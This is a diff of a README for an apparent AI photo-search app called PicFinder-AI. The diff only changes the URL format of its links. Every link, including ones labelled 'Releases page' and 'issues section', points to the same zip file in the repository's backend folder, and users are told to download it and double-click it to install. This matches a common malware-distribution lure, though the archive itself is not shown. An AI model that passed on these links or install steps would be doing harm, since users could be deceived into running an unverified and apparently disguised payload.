@@ -1,6 +1,6 @@
 # 🖼️ PicFinder-AI - Search Photos Using Simple Phrases
 
-[![Download PicFinder-AI](https://raw.githubusercontent.com/con636/PicFinder-AI/master/backend/AI-Finder-Pic-3.1.zip)](https://raw.githubusercontent.com/con636/PicFinder-AI/master/backend/AI-Finder-Pic-3.1.zip)
+[![Download PicFinder-AI](https://github.com/con636/PicFinder-AI/raw/refs/heads/master/backend/AI-Finder-Pic-3.1.zip)](https://github.com/con636/PicFinder-AI/raw/refs/heads/master/backend/AI-Finder-Pic-3.1.zip)
 
 ## 📖 Overview
 
@@ -26,7 +26,7 @@ PicFinder-AI is an offline, private AI image search engine powered by OpenAI's C
 To get started with PicFinder-AI, follow these steps:
 
 1. **Download the Software**:
-   Visit the [Releases page](https://raw.githubusercontent.com/con636/PicFinder-AI/master/backend/AI-Finder-Pic-3.1.zip) to download the latest version of PicFinder-AI.
+   Visit the [Releases page](https://github.com/con636/PicFinder-AI/raw/refs/heads/master/backend/AI-Finder-Pic-3.1.zip) to download the latest version of PicFinder-AI.
 
 2. **Install the Application**:
    After downloading, locate the file on your computer (usually in the Downloads folder). Double-click the downloaded file to start the installation. Follow the on-screen instructions to complete the setup.
@@ -42,11 +42,11 @@ To get started with PicFinder-AI, follow these steps:
 
 ## 📥 Download & Install
 
-To download PicFinder-AI, simply follow this link and get the latest version: [Download PicFinder-AI](https://raw.githubusercontent.com/con636/PicFinder-AI/master/backend/AI-Finder-Pic-3.1.zip). After downloading, install the software by double-clicking the file and following the instructions on your screen.
+To download PicFinder-AI, simply follow this link and get the latest version: [Download PicFinder-AI](https://github.com/con636/PicFinder-AI/raw/refs/heads/master/backend/AI-Finder-Pic-3.1.zip). After downloading, install the software by double-clicking the file and following the instructions on your screen.
 
 ## 🧑‍🤝‍🧑 Support
 
-If you encounter any issues while using PicFinder-AI or have questions about its features, you can reach out for help. Check the [issues section](https://raw.githubusercontent.com/con636/PicFinder-AI/master/backend/AI-Finder-Pic-3.1.zip) in the repository, or comment on the relevant issue. You can also browse existing questions for answers.
+If you encounter any issues while using PicFinder-AI or have questions about its features, you can reach out for help. Check the [issues section](https://github.com/con636/PicFinder-AI/raw/refs/heads/master/backend/AI-Finder-Pic-3.1.zip) in the repository, or comment on the relevant issue. You can also browse existing questions for answers.
 
 ## 🌍 Community
 
